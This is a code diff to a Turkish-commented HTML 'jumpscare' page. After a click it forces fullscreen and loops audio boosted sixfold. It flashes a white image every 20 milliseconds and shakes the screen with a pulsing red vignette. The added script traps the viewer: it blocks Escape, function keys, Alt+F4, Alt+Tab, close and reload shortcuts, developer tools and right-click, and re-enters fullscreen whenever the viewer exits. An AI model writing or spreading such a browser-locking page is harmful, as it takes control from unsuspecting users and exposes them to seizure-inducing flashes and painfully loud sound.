@@ -45,7 +45,6 @@
     text-transform: uppercase;
   }
 
-  /* overlay */
   #overlay {
     display: none;
     position: fixed;
@@ -64,6 +63,45 @@
 
   #imgNormal { z-index: 1; }
   #imgWhite  { z-index: 2; opacity: 0; }
+
+  /* ekranı sarsma */
+  @keyframes shake {
+    0%,100% { transform: translate(0,0) rotate(0deg); }
+    10%      { transform: translate(-8px, -6px) rotate(-1deg); }
+    20%      { transform: translate(10px,  5px) rotate(1deg); }
+    30%      { transform: translate(-6px,  8px) rotate(0deg); }
+    40%      { transform: translate(8px,  -7px) rotate(1deg); }
+    50%      { transform: translate(-10px, 4px) rotate(-1deg); }
+    60%      { transform: translate(6px,   9px) rotate(0deg); }
+    70%      { transform: translate(-8px, -5px) rotate(1deg); }
+    80%      { transform: translate(9px,   6px) rotate(-1deg); }
+    90%      { transform: translate(-5px, -9px) rotate(0deg); }
+  }
+
+  #overlay.shake {
+    animation: shake 0.18s linear infinite;
+  }
+
+  /* kırmızı vinyette pulse */
+  #overlay::after {
+    content: '';
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 10000;
+    pointer-events: none;
+    box-shadow: inset 0 0 120px 60px rgba(180,0,0,0.55);
+    animation: vignette-pulse 0.3s ease-in-out infinite alternate;
+  }
+
+  #overlay.active::after {
+    display: block;
+  }
+
+  @keyframes vignette-pulse {
+    from { box-shadow: inset 0 0 120px 60px rgba(180,0,0,0.4); }
+    to   { box-shadow: inset 0 0 180px 90px rgba(220,0,0,0.75); }
+  }
 </style>
 </head>
 <body>
@@ -79,12 +117,41 @@
 </div>
 
 <audio id="scareAudio" loop>
-  <source src="https://www.myinstants.com/media/sounds/final_60108db6919bc200b087a3a2_239343.mp3" type="audio/mpeg">
+  <source src="output.wav" type="audio/wav">
 </audio>
 
 <script>
   const INTERVAL = 20;
   let triggered = false;
+
+  // ── Klavye hapsi: ESC, F11, F5, Alt+F4, Ctrl+W, Ctrl+R, vs. ──
+  const BLOCKED = new Set([
+    "Escape","F11","F5","F1","F2","F3","F4","F6","F7","F8","F9","F10","F12"
+  ]);
+
+  document.addEventListener("keydown", function(e) {
+    // ESC, F11 ve tüm F tuşları
+    if (BLOCKED.has(e.key)) { e.preventDefault(); e.stopPropagation(); return false; }
+    // Alt+F4, Alt+Tab
+    if (e.altKey && (e.key === "F4" || e.key === "Tab")) { e.preventDefault(); e.stopPropagation(); return false; }
+    // Ctrl+W  Ctrl+R  Ctrl+Shift+I  Ctrl+Shift+J  Ctrl+U
+    if (e.ctrlKey && ["w","r","u","W","R","U"].includes(e.key)) { e.preventDefault(); e.stopPropagation(); return false; }
+    if (e.ctrlKey && e.shiftKey && ["i","j","I","J","c","C"].includes(e.key)) { e.preventDefault(); e.stopPropagation(); return false; }
+    // Windows tuşu
+    if (e.key === "Meta" || e.key === "OS") { e.preventDefault(); e.stopPropagation(); return false; }
+  }, true);
+
+  // Sağ tık kapat
+  document.addEventListener("contextmenu", e => e.preventDefault());
+
+  // Fullscreen'den çıkmayı engelle: kullanıcı ESC ile çıkarsa tekrar gir
+  document.addEventListener("fullscreenchange", () => {
+    if (triggered && !document.fullscreenElement) {
+      const el  = document.documentElement;
+      const req = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
+      if (req) req.call(el).catch(() => {});
+    }
+  });
 
   document.addEventListener("click", function() {
     if (triggered) return;
@@ -99,20 +166,30 @@
     const req = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
     if (req) req.call(el).catch(() => {});
 
-    // Ses
+    // WebAudio ile ses — gainNode ile max volume + distortion
+    const ctx        = new (window.AudioContext || window.webkitAudioContext)();
+    const gainNode   = ctx.createGain();
+    gainNode.gain.value = 6.0; // 6x amplifikasyon
+    gainNode.connect(ctx.destination);
+
+    // <audio> elemanını WebAudio'ya bağla
+    const source = ctx.createMediaElementSource(audio);
+    source.connect(gainNode);
+
     audio.volume = 1;
     audio.play().catch(() => {});
 
     // Overlay
     overlay.style.display = "block";
+    overlay.classList.add("shake", "active");
 
-    // Yanıp sönme döngüsü
+    // Yanıp sönme + beyazlama döngüsü
     let show = false;
     setInterval(() => {
       show = !show;
       imgWhite.style.opacity = show ? "1" : "0";
     }, INTERVAL);
-  });
+  }, { once: true });
 </script>
 
 </body>
